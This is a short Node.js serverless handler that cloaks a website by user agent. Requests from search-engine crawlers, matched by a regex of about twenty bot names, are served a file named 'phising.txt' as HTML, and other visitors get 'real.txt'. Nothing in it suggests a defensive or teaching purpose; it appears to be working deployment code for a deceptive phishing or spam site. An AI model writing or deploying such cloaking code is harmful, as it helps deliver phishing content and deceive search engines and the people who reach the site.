const fs = require("fs");
const path = require("path");

const spiderPattern = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|ia_archiver|semrushbot|ahrefsbot|mj12bot|dotbot|seznambot|petalbot|applebot|bytespider|yisouspider|360spider/i;

module.exports = (req, res) => {
  const userAgent = req.headers["user-agent"] || "";

  let fileName = "real.txt";

  if (userAgent && spiderPattern.test(userAgent)) {
    fileName = "phising.txt";
  }

  const filePath = path.join(process.cwd(), fileName);

  try {
    const content = fs.readFileSync(filePath, "utf8");
    res.setHeader("Content-Type", "text/html");
    res.status(200).send(content);
  } catch (err) {
    res.status(500).send("File error");
  }
};
